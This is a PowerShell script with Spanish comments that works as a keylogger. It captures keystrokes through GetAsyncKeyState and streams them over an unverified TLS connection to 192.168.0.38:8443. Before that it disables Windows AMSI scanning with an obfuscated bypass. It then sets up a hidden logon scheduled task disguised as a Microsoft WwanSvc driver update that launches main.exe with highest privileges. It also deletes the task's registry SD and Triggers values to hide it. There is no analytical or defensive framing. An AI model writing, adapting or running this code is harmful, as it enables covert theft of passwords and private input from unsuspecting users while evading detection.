Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public static string GetKeyPresses()
    {
        string pressedKeys = "";
        for (int keyCode = 8; keyCode <= 255; keyCode++)
        {
            int state = GetAsyncKeyState(keyCode);
            if (state != 0)
            {
                pressedKeys += ((ConsoleKey)keyCode).ToString() + " ";
            }
        }
        return pressedKeys;
    }
}
"@

#AMSI bypass
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}"  -f  'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}"  -f  ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}"   -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)

$ip = "192.168.0.38"
$puerto = 8443

# Crear TcpClient y conectar
$tcpClient = New-Object System.Net.Sockets.TcpClient
$tcpClient.Connect($ip, $puerto)

# Obtener el stream de red
$networkStream = $tcpClient.GetStream()

# Crear un stream SSL encima del stream de red
$sslStream = New-Object System.Net.Security.SslStream($networkStream, $false, { $true })  # Validación de certificado deshabilitada

# Realizar handshake SSL/TLS (el "servidor" debe tener TLS habilitado)
$sslStream.AuthenticateAsClient($ip)

# Preparar acumulador de teclas
$keysBuffer = ""

while ($true) {
    Start-Sleep -Milliseconds 50
    $keys = [Keyboard]::GetKeyPresses()
    if ($keys -ne "") {
        $keysBuffer += $keys
        if ($keysBuffer.Length -gt 0) {
            try {
                if (-not $sslStream.CanWrite) {
                    Write-Host "SSL stream no escribible. Saliendo."
                    break
                }
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($keysBuffer)
                $sslStream.Write($bytes, 0, $bytes.Length)
                $sslStream.Flush()
                $keysBuffer = ""
            } catch {
                Write-Host "Error al escribir en el stream. Saliendo..."
                break
            }
        }
    }
}


schtasks /create /tn "\Microsoft\Windows\WwanSvc\Update Drivers" /tr "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe\"" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \""Start-Process 'C:\ProgramData\main.exe'\""" /sc onlogon /ru Martin /RL HIGHEST /f
$taskKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\WwanSvc\Update Drivers"
if (Test-Path $taskKey) {
    Remove-ItemProperty -Path $taskKey -Name "SD" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $taskKey -Name "Triggers" -ErrorAction SilentlyContinue
}
